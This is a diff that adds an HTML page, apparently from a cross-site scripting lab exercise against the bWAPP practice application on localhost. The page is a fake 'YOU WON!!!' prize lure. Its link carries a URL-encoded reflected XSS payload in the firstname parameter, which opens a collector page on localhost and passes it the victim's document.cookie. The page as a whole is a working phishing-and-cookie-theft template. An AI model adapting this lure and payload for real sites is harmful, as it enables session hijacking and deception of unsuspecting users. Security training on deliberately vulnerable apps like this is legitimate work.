@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CROSS SITE SCRIPTING</title>
+</head>
+<style>
+    *{
+        margin: 0;
+        padding: 0;
+    }
+    
+    .text {
+        text-align: center;
+    }
+    .success {
+        color: red;
+        background-color: rgb(211, 202, 199);
+        border: 1px solid #000;
+        height: 120px;
+    }
+
+    .bg{
+        background-image: url("https://msmobile.com.vn/upload_images/images/hinh-nen-minion-cho-may-tinh-1.png");
+        /*background-repeat: no-repeat, repeat;*/
+        background-size: cover;
+        height: 600px;
+    }
+</style>
+<body>
+    <div class="success">
+        <h1 class="text">CONGRATULATIONS!!!</h1>
+        <h1 class="text">YOU WON!!!</h1>
+        <p class="text"> 
+            Click
+        <a href="http://localhost/bwapp/xss_get.php?firstname=%3Cscript%3Ewindow.open%28%22http%3A%2F%2Flocalhost%2Fatm%2Fget.php%3Fcookie%3D%22%2Bdocument.cookie%29%3C%2Fscript%3E&lastname=Pham&form=submit">this</a>           
+        to see your prize
+        </p>
+    </div>
+    <div class="bg"></div>
+<body>
